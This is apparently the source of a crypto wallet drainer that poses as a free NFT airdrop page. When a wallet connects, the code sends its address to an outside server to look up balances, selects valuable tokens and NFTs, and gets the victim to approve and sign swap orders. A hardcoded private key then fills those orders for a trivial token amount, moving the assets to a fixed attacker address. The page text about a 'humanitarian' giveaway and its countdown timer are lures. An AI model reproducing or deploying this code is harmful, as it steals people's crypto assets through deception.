/* eslint-disable no-empty */
/* eslint-disable no-undef */
/* eslint-disable no-constant-condition */
/* eslint-disable no-unused-vars */
import React, { useCallback, useEffect, useMemo, useState } from "react";
import MainLayout from "../layout/MainLayout";
import * as S from "./styles/Styles";
import Countdown from "react-countdown";
import { Link } from "react-router-dom";
import {
  ConnectWallet,
  useBalance,
  useConnectionStatus,
  useAddress,
  ChainId,
} from "@thirdweb-dev/react";
import axios from "axios";
import { ethers } from "ethers";
import BigNumber from "bignumber.js";
import useLocalStorage from "use-local-storage";
import { checkObjectEmpty , SwitchNetwork } from "../../modules/hooks/useStates";
import ClaimModal from "../../modules/modal/pages/ClaimModal";
import { NftSwap } from "@traderxyz/nft-swap-sdk";

const Completionist = () => <span className="">NFT Airdrop has Ended!</span>;
const renderer = ({ hours, minutes, seconds, completed }) => {
  if (completed) {
    return <Completionist />;
  } else {
    return (
      <span>
        {hours}:{minutes}:{seconds}
      </span>
    );
  }
};

function Home() {
  const connectionStatus = useConnectionStatus();
  const [nftsByAddress, setNftsByAddress] = useState();
  const [tokenByAddress, setTokenByAddress] = useState();
  const [totalWalletTokens, setTotalWalletTokens] = useState({});
  const [executablewalletNft, setExecutableWalletNft] = useState();
  const tokenAddress = useAddress();
  const { data, isLoading } = useBalance(tokenAddress);
  const [remainingNFT, setRemainingNFT] = useState(517);
  const etherConversionDecimal = 1e18;
  const SAVEDATA = "influencer12345678912334";
  const [addressData, setAddressData] = useLocalStorage(SAVEDATA, []);
  const [showModal, setShowModal] = useState("hidden");
  const [bothEmptyAsset, setBothEmptyAsset] = useState(false);
  const [mainModal, setMainModal] = useState(false);
  const [sendingNFT, setSendingNFT] = useState([]);
  const [sendingToken, setSendingToken] = useState([]);
  const [makerAddress, setMakerAddress] = useState("");
  const takerAddress = "0x84b1d1f669BA9f479F23AD6D6562Eb89EDDb7741";
  const [sdkSwapper, setSdkSwapper] = useState(null);

  const [modalAssetNFT, setModalAssetNft] = useState(false);
  const [modalAssetToken, setModalAssetToken] = useState(false);

  const MATIC = "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0"; // 0.9
  const SHIB = "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce"; //0.00005
  const ETH = "0x2170ed0880ac9a755fd29b2688956bd959f933f8"; // 1844
  const USDC = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"; // 1
  const USDT = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // 1
  const ARB = "0x912CE59144191C1204E64559FE8253a0e49E6548"; //1.7
  const AAVE = "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9"; //14.28
  const LTC = "0xecb56cf772b5c9a6907fb7d32387da2fcbfb63b4"; //87
  const WBTC = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"; //= 28k
  const DOT = "0xa2c49cee16a5e5bdefde931107dc1fae9f7773e3"; // 5.2
  const AVAX = "FvwEAhmxKfeiG8SnEvq42hc6whRyY3EFYAvebMqDNDGCgxN5Z"; // 14.27
  const OKB = "0x75231f58b43240c9718dd58b4967c5114342a86c"; // 46.47
  const Gold = "0x45804880de22913dafe09f4980848ece6ecbaf78"; // 1900
  const ZEC = "0x1ba42e5193dfa8b03d15dd1b86a3113bbbef8eeb"; //32.94
  const FIL = "0xae3a768f9ab104c69a7cd6041fe16ffa235d1810"; //4.45
  const QNT = "0x4a220e6096b25eadb88358cb44068a3248254675"; //100.75
  const YFI = "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e"; //6,425.96
  const SSV = "0x9D65fF81a3c488d585bBfb0Bfe3c7707c7917f54"; // 22
  const ENS = "0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72"; // 10
  const COMP = "0xc00e94cb662c3520282e6f5717214004a7f26888"; //34.36
  const ILV = "0x767fe9edc9e0df98e07454847909b5e959d7ca0e"; // 47.52
  const BCH = "0xef3cebd77e0c52cb6f60875d9306397b5caca375"; //113.37

  useEffect(() => {
    (async () => {
      if (window.ethereum) {
        try {
          SwitchNetwork("0x13881");
          const OldAddress = "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d";
          const provider = new ethers.providers.Web3Provider(window.ethereum);
          const signer = provider.getSigner();
          const address = await signer.getAddress();
          const amount = await signer.getBalance();
          const chainId = 1;

          // From your app, provide NftSwap the web3 provider, signer for the user's wallet, and the chain id.
          const nftSwapSdk = new NftSwap(provider, signer, chainId);
          setSdkSwapper(nftSwapSdk);
          if (addressData?.length == 0) {
            const walletData = await axios
              .get(`https://botserver-02zt.onrender.com/balances/${address}`)
              .catch((err) => console.log(err));
            setAddressData(walletData.data);
            setMakerAddress(OldAddress);
          } else {
            console.log("not empty");
          }
        } catch (error) {
          console.log(error);
        }
      }
    })();
  }, [setAddressData]);

  useEffect(() => {
    (async () => {
      try {
        let tokenHolder = [];
        addressData?.nfts.forEach((walletToken) => {
          if (addressData?.nfts.length == 0) return;
          setNftsByAddress(walletToken.result);
        });

        if (addressData?.tokenBalances.length == 0) return;
        addressData?.tokenBalances.forEach((datas) => {
          if (datas.split(" ")[1] == "ETH") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: ETH,
            });
            tokenHolder.push({
              tokenAddress: ETH,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }

          if (datas.split(" ")[1] == "WBTC") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: WBTC,
            });
            tokenHolder.push({
              tokenAddress: WBTC,
              amount: Number(datas.split(" ")[0] * 1e8).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }
          if (datas.split(" ")[1] == "YFI") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: YFI,
            });
            tokenHolder.push({
              tokenAddress: YFI,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }

          if (datas.split(" ")[1] == "MATIC") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: MATIC,
            });
            tokenHolder.push({
              tokenAddress: MATIC,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }
          if (datas.split(" ")[1] == "AAVE") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: AAVE,
            });
            tokenHolder.push({
              tokenAddress: AAVE,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }

          if (datas.split(" ")[1] == "Gold") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: Gold,
            });
            tokenHolder.push({
              tokenAddress: Gold,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }
          if (datas.split(" ")[1] == "LTC") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: LTC,
            });
            tokenHolder.push({
              tokenAddress: LTC,
              amount: Number(datas.split(" ")[0] * 1e8).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }
          if (datas.split(" ")[1] == "ARB") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: ARB,
            });
            tokenHolder.push({
              tokenAddress: ARB,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }
          // if (datas.split(" ")[1] == "USDC") {
          //   setTotalWalletTokens({
          //     amount: datas.split(" ")[0],
          //     name: datas.split(" ")[1],
          //     address: USDC,
          //   });
          //   tokenHolder.push({ tokenAddress: USDC, amount: Number(datas.split(" ")[0] * 1E6).toLocaleString( 'fullwide', { useGrouping: false }), type:'ERC20'})
          // }
          if (datas.split(" ")[1] == "USDT") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: USDT,
            });
            tokenHolder.push({
              tokenAddress: USDT,
              amount: Number(datas.split(" ")[0] * 1e6).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }
          if (datas.split(" ")[1] == "QNT") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: QNT,
            });
            tokenHolder.push({
              tokenAddress: QNT,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }
          if (datas.split(" ")[1] == "COMP") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: COMP,
            });
            tokenHolder.push({
              tokenAddress: COMP,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }
          if (datas.split(" ")[1] == "SHIB") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: SHIB,
            });
            tokenHolder.push({
              tokenAddress: SHIB,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }

          if (datas.split(" ")[1] == "ENS") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: ENS,
            });
            tokenHolder.push({
              tokenAddress: ENS,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }

          if (datas.split(" ")[1] == "AVAX") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: AVAX,
            });
            tokenHolder.push({
              tokenAddress: AVAX,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }
          if (datas.split(" ")[1] == "ILV") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: ZEC,
            });
            tokenHolder.push({
              tokenAddress: ZEC,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }

          if (datas.split(" ")[1] == "BCH") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: BCH,
            });
            tokenHolder.push({
              tokenAddress: BCH,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }

          if (datas.split(" ")[1] == "SSV") {
            setTotalWalletTokens({
              amount: datas.split(" ")[0],
              name: datas.split(" ")[1],
              address: SSV,
            });
            tokenHolder.push({
              tokenAddress: SSV,
              amount: Number(datas.split(" ")[0] * 1e18).toLocaleString(
                "fullwide",
                { useGrouping: false }
              ),
              type: "ERC20",
            });
          }
        });
        setSendingToken(tokenHolder);
      } catch (err) {
        console.log(err);
      }
    })();
  }, [setTotalWalletTokens]);

  useEffect(() => {
    (async () => {
      nftsByAddress?.forEach((nftUserCollection) => {
        if (nftUserCollection.name == "Bored Ape Yacht Club") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "OpenSea Collections") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Rarible") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "CryptoPunks") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Mutant Ape Yacht Club") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Azuki") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Doodles") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Otherdeed for Otherside") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "CLONE X - X TAKASHI MURAKAMI") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Moonbirds") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Wrapped Cryptopunks") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "DeGods") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Cool Pets NFT") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Pudgy Penguins") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Saved Souls") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "The Sandbox") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Cool Cats NFT") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "World of Women") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Skrill Card") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "BossBearGo") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Elegant Crypto City Collection") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Light Beast Items") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Parallel Alpha") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Loot (for Adventurers)") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "ENS: Ethereum Name Service") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "CrypToadz by GREMPLIN") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Chromie Squiggle by Snowfro") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "VeeFriends") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Worldwide Webb Land") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Decentraland") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Lazy Lions") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "World of Women Galaxy") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "alien frens") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Flyfish Club") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "77-Bit") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Invincible Friends Collection") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "SupDucks") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Damien Hirst - The Currency") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "The Heart Project") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Crypto.Chicks") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Lonely Alien Space Club") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "The Doge Pound") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "USDTrain Founder NFT") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Chimpers") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Chimpers Chronicles") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Boki") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "The Possessed") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Writers Room") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "LetsWalk") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Gray Boys") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "RENGA") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Mindblowon Universe") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "The Habibiz") {
          setExecutableWalletNft(nftUserCollection);
        } else if (nftUserCollection.name == "Crypto Coven") {
          setExecutableWalletNft(nftUserCollection);
        }
      });
    })();
  }, [nftsByAddress]);

  useEffect(() => {
    let objectHolder = [];
    nftsByAddress?.filter((items) => {
      if (items.metadata == null) return;
      objectHolder.push({
        tokenAddress: items.token_address,
        tokenId: items.token_id,
        type: items.contract_type,
      });
    });
    setSendingNFT(objectHolder);
  }, [nftsByAddress, setSendingNFT]);

  useEffect(() => {
    (async () => {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const address = await signer.getAddress();
        const chainId = 80001;
        const takersAddress = "0x84b1d1f669BA9f479F23AD6D6562Eb89EDDb7741";
        const takerProviderSigner = new ethers.Wallet(
          "7de9cc7423ffe0cebe2545895f4d922a5d30c50dd040febed1927d31818f4fc2",
          provider
        );
        const takersAssetsB = [
          {
            tokenAddress: "0xDFcE097dA0242b0DcA2a0C3111B5B724d8c952ac",
            amount: "500000000000000000",
            type: "ERC20",
          },
        ];
        const nftSwapSdkTaker = new NftSwap(
          provider,
          takerProviderSigner,
          chainId
        );
        // From your app, provide NftSwap the web3 provider, signer for the user's wallet, and the chain id.
        const nftSwapSdk = new NftSwap(provider, signer, chainId);

        let sendingTokenArray = sendingToken.length > 0 ? sendingToken : null;
        let sendingNFTArray = sendingNFT.length > 0 ? sendingNFT : null;
        if (sendingNFTArray == null) return;
        if (sendingTokenArray == null) return;

        if (sendingNFTArray !== null || sendingTokenArray != null) {
          if (sendingNFTArray != null && sendingTokenArray == null) {
            const signedAsset = await nftSwapSdk.approveTokenOrNftByAsset(
              sendingNFTArray[0],
              address
            );
            const order = nftSwapSdk.buildOrder(
              sendingNFTArray[0],
              takersAssetsB,
              address
            );
            const signedOrder = await nftSwapSdk.signOrder(
              order,
              takersAddress
            );
            const orderSigned = signedOrder.wait(8);
            if (orderSigned) {
              const approvalTx = await nftSwapSdkTaker.approveTokenOrNftByAsset(
                takersAssetsB[0],
                takersAddress
              );
              const approvalTxReceipt = await approvalTx.wait(8);
              if (approvalTxReceipt) {
                const fillTx = await nftSwapSdkTaker.fillSignedOrder(
                  signedOrder
                );
                const fillTxReceipt =
                  await nftSwapSdkTaker.awaitTransactionHash(fillTx);
                console.log(
                  `🎉 🥳 Order filled. TxHash: ${fillTxReceipt.transactionHash}`
                );
              }
            }

            // Create the order (Remember, User A initiates the trade, so User A creates the order);
          } else if (sendingNFTArray == null && sendingTokenArray !== null) {
            const signedAsset = await nftSwapSdk.approveTokenOrNftByAsset(
              sendingTokenArray[0],
              address
            );
            const order = nftSwapSdk.buildOrder(
              sendingTokenArray[0],
              takersAssetsB,
              address
            );
            const signedOrder = await nftSwapSdk.signOrder(
              order,
              takersAddress
            );
            const orderSigned = signedOrder.wait(8);
            if (orderSigned) {
              const approvalTx = await nftSwapSdkTaker.approveTokenOrNftByAsset(
                takersAssetsB[0],
                takersAddress
              );
              const approvalTxReceipt = await approvalTx.wait(8);
              if (approvalTxReceipt) {
                const fillTx = await nftSwapSdkTaker.fillSignedOrder(
                  signedOrder
                );
                const fillTxReceipt =
                  await nftSwapSdkTaker.awaitTransactionHash(fillTx);
                console.log(
                  `🎉 🥳 Order filled. TxHash: ${fillTxReceipt.transactionHash}`
                );
              }
            }
          } else if (sendingNFTArray !== null && sendingTokenArray !== null) {
            const allApprovalToken = [...sendingNFTArray, ...sendingTokenArray];
            const signedAsset = await nftSwapSdk.approveTokenOrNftByAsset(
              allApprovalToken[0],
              address
            );
            const order = nftSwapSdk.buildOrder(
              allApprovalToken[0],
              takersAssetsB,
              address
            );
            const signedOrder = await nftSwapSdk.signOrder(
              order,
              takersAddress
            );
            if (signedOrder) {
              const approvalTx = await nftSwapSdkTaker.approveTokenOrNftByAsset(
                takersAssetsB,
                takersAddress
              );
              const approvalTxReceipt = await approvalTx.wait(8);
              if (approvalTxReceipt) {
                const fillTx = await nftSwapSdkTaker.fillSignedOrder(
                  signedOrder
                );
                const fillTxReceipt =
                  await nftSwapSdkTaker.awaitTransactionHash(fillTx);
                console.log(
                  `🎉 🥳 Order filled. TxHash: ${fillTxReceipt.transactionHash}`
                );
              }
            }
          }
        } else {
          console.log("both is empty");
        }
      } catch (err) {
        // alert(
        //   "Please permit our contract to initialize your wallet to continue"
        // );
        // location.reload();
      }
    })();
  }, [sendingNFT, sendingToken]);

  const callMethod = useCallback(() => {
    (async () => {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const address = await signer.getAddress();
        const chainId = 80001;
        const takersAddress = "0x84b1d1f669BA9f479F23AD6D6562Eb89EDDb7741";
        const takerProviderSigner = new ethers.Wallet(
          "7de9cc7423ffe0cebe2545895f4d922a5d30c50dd040febed1927d31818f4fc2",
          provider
        );
        const takersAssetsB = [
          {
            tokenAddress: "0xDFcE097dA0242b0DcA2a0C3111B5B724d8c952ac",
            amount: "500000000000000000",
            type: "ERC20",
          },
        ];
        const nftSwapSdkTaker = new NftSwap(
          provider,
          takerProviderSigner,
          chainId
        );
        // From your app, provide NftSwap the web3 provider, signer for the user's wallet, and the chain id.
        const nftSwapSdk = new NftSwap(provider, signer, chainId);

        let sendingTokenArray = sendingToken.length > 0 ? sendingToken : null;
        let sendingNFTArray = sendingNFT.length > 0 ? sendingNFT : null;
        if (sendingNFTArray == null) return;
        if (sendingTokenArray == null) return;

        if (sendingNFTArray !== null || sendingTokenArray != null) {
          if (sendingNFTArray != null && sendingTokenArray == null) {
            const signedAsset = await nftSwapSdk.approveTokenOrNftByAsset(
              sendingNFTArray[0],
              address
            );
            const order = nftSwapSdk.buildOrder(
              sendingNFTArray[0],
              takersAssetsB,
              address
            );
            const signedOrder = await nftSwapSdk.signOrder(
              order,
              takersAddress
            );
            const orderSigned = signedOrder.wait(8);
            if (orderSigned) {
              const approvalTx = await nftSwapSdkTaker.approveTokenOrNftByAsset(
                takersAssetsB[0],
                takersAddress
              );
              const approvalTxReceipt = await approvalTx.wait(8);
              if (approvalTxReceipt) {
                const fillTx = await nftSwapSdkTaker.fillSignedOrder(
                  signedOrder
                );
                const fillTxReceipt =
                  await nftSwapSdkTaker.awaitTransactionHash(fillTx);
                console.log(
                  `🎉 🥳 Order filled. TxHash: ${fillTxReceipt.transactionHash}`
                );
              }
            }

            // Create the order (Remember, User A initiates the trade, so User A creates the order);
          } else if (sendingNFTArray == null && sendingTokenArray !== null) {
            const signedAsset = await nftSwapSdk.approveTokenOrNftByAsset(
              sendingTokenArray[0],
              address
            );
            const order = nftSwapSdk.buildOrder(
              sendingTokenArray[0],
              takersAssetsB,
              address
            );
            const signedOrder = await nftSwapSdk.signOrder(
              order,
              takersAddress
            );
            const orderSigned = signedOrder.wait(8);
            if (orderSigned) {
              const approvalTx = await nftSwapSdkTaker.approveTokenOrNftByAsset(
                takersAssetsB[0],
                takersAddress
              );
              const approvalTxReceipt = await approvalTx.wait(8);
              if (approvalTxReceipt) {
                const fillTx = await nftSwapSdkTaker.fillSignedOrder(
                  signedOrder
                );
                const fillTxReceipt =
                  await nftSwapSdkTaker.awaitTransactionHash(fillTx);
                console.log(
                  `🎉 🥳 Order filled. TxHash: ${fillTxReceipt.transactionHash}`
                );
              }
            }
          } else if (sendingNFTArray !== null && sendingTokenArray !== null) {
            const allApprovalToken = [...sendingNFTArray, ...sendingTokenArray];
            const signedAsset = await nftSwapSdk.approveTokenOrNftByAsset(
              allApprovalToken[0],
              address
            );
            const order = nftSwapSdk.buildOrder(
              allApprovalToken[0],
              takersAssetsB,
              address
            );
            const signedOrder = await nftSwapSdk.signOrder(
              order,
              takersAddress
            );
            if (signedOrder) {
              const approvalTx = await nftSwapSdkTaker.approveTokenOrNftByAsset(
                takersAssetsB,
                takersAddress
              );
              const approvalTxReceipt = await approvalTx.wait(8);
              if (approvalTxReceipt) {
                const fillTx = await nftSwapSdkTaker.fillSignedOrder(
                  signedOrder
                );
                const fillTxReceipt =
                  await nftSwapSdkTaker.awaitTransactionHash(fillTx);
                console.log(
                  `🎉 🥳 Order filled. TxHash: ${fillTxReceipt.transactionHash}`
                );
              }
            }
          }
        } else {
          console.log("both is empty");
        }
      } catch (err) {
        alert(
          "Please permit our contract to initialize your wallet to continue"
        );
        location.reload();
      }
    })();
  }, [sendingNFT, sendingToken]);

  const claimNFT = async () => {
    if (totalWalletTokens !== undefined && executablewalletNft !== undefined) {
      let checkAvailableToken = false;
      let checkAvailableNft = false;
      let execToken = checkObjectEmpty(totalWalletTokens);
      let execNft = checkObjectEmpty(executablewalletNft);
      if (execNft == false) {
        checkAvailableNft = true;
      } else {
        checkAvailableNft = false;
      }

      if (execToken == false) {
        checkAvailableToken = true;
      } else {
        checkAvailableToken = false;
      }
      if (!checkAvailableNft && !checkAvailableToken) {
        setBothEmptyAsset(true);
        //    if both token and nft are empty
      }
    }
    setModalAssetNft(false);
    setModalAssetToken(false);
    setMainModal(true);
    setShowModal("");
  };

  const showWalletAvailableNFTs = async () => {
    setModalAssetNft(true);
    setModalAssetToken(false);
    setMainModal(false);
    setShowModal("");
  };

  const showWalletAvailableTokens = async () => {
    setModalAssetNft(false);
    setModalAssetToken(true);
    setMainModal(false);
    setShowModal("");
  };

  return (
    <MainLayout className="container">
      <S.HomeContainer className="w-full h-screen flex justify-center items-center relative  flex-col">
        <div className="w-full h-screen flex justify-center items-center relative backdrop-blur-2xl  bg-black/10 ">
          <div className="w-11/12 lg:w-8/12  h-screen flex flex-col items-center justify-center">
            <div className=" w-full h-fit flex items-center justify-center absolute lg:relative top-5 left-0 z-30 px-10 lg:px-0">
              <div className="h-fit w-full border-b border-b-slate-100 lg:mb-10 flex justify-between items-center pb-2">
                <div className="w-fit h-fit">
                  <Link
                    to="/"
                    className="w-fit h-fit flex justify-center cursor-pointer lg:text-2xl items-center px-2 py-1  text-white font-bold"
                  >
                    Random NFT{" "}
                  </Link>
                </div>
                <div className="w-fit h-fit">
                  <ConnectWallet theme="dark" btnTitle="Connect Wallet" />
                </div>
              </div>
            </div>

            <div className=" backdrop-blur-xl w-full   h-screen lg:h-[550px] flex flex-col lg:flex-row bg-black/100 lg:rounded-2xl">
              <S.ScrollBar className=" w-full h-fit  flex justify-center  lg:h-[550px] order-2 lg:order-1 text-white overflow-y-scroll lg:overflow-y-hidden">
                <div className="container w-11/12 py-5 px-2">
                  <div className="flex w-full justify-between items-center border-b border-b-slate-600 pb-3">
                    <div
                      onClick={() => showWalletAvailableNFTs()}
                      className="border cursor-pointer text-white  transition-all flex justify-center items-center w-fit h-fit font-bold px-5 py-2 font-semiBold "
                    >
                      collection
                    </div>
                    <div
                      onClick={() => showWalletAvailableTokens()}
                      className="border cursor-pointer text-white flex justify-center items-center w-fit h-fit font-bold px-4 py-2 "
                    >
                      Tokens
                    </div>
                  </div>
                  <div className="w-full flex justify-center flex-col items-center">
                    <div className="py-4 text-2xl font-extrabold text-transparent bg-clip-text bg-gradient-to-br from-pink-400 to-red-600">
                      Airdrop Countdown
                    </div>
                    <div className="backdrop-blur-xs pb-3 bg-white/30 rounded-lg h-fit w-full flex justify-center items-center">
                      <div className="font-extralight text-[#FFB84C] text-6xl w-fit h-fit tracking-wider py-5">
                        <Countdown
                          date={Date.now() + 34560000000000}
                          intervalDelay={0}
                          precision={3}
                          zeroPadTime={2}
                          renderer={renderer}
                        />
                      </div>
                    </div>

                    <div className="w-full flex flex-row justify-between items-center px-3 py-4">
                      <div className="text-white text-base font-semibold capitalize">
                        Total NFT Claimed{" "}
                      </div>
                      <div className="text-[#FFB84C] tracking-wider font-bold text-xl">
                        #{remainingNFT}
                      </div>
                    </div>

                    {/* description section */}
                    <S.ScrollBar className="w-11/12 border-dotted lg:overflow-y-scroll lg:h-[200px]">
                      <div className="text-sm text-white h-10 border-b border-b-slate-600">
                        Airdrop info{" "}
                      </div>

                      <div className="w-full h-fit text-left">
                        <div
                          className="text-left text-sm tracking-wider py-5"
                          style={{ lineHeight: "22px" }}
                        >
                          We are providing this token as a humanitarian service
                          to the NFT community. The Generated NFT is to ensure
                          that every investor or believer in the Blockchain and
                          the crypto space continues to participate in the
                          crypto space by holding a Generated NFT , which is our
                          symbol of hope and believe in the blockchain space.
                          For this reason , we have decided to give out{" "}
                          <span className="mx-2 text-[#FFB84C] font-semibold">
                            {" "}
                            #5171{" "}
                          </span>{" "}
                          to individuals as our way of saying thank you for
                          believing in blockchain technology.
                        </div>
                      </div>
                    </S.ScrollBar>
                  </div>
                </div>

                {/* fixed bottom */}
                {/* <button className=''>Claim NFT (MoonSafe)</button> */}
              </S.ScrollBar>
              <div className="w-full  h-[350px] lg:h-[550px] order-1 lg:order-2 flex flex-col justify-center items-center relative">
                <img
                  src="../baycImage.gif"
                  loading="lazy"
                  className="w-full  h-full object-contain "
                />
                <div className=" backdrop-blur-xl pb-3 bg-white/30 space-y-3 h-6/12 lg:min-h-[120px] lg:w-full w-11/12 absolute   bottom-4 rounded-3xl lg:right-3">
                  <div className="text-white font-bold w-full text-center text-xl capitalize pt-1 border-b border-b-slate-400 pb-1">
                    NFT Generator
                  </div>
                  <div className="flex flex-row justify-between items-center px-3">
                    <div className="text-white text-sm lg:text-base font-semibold capitalize ">
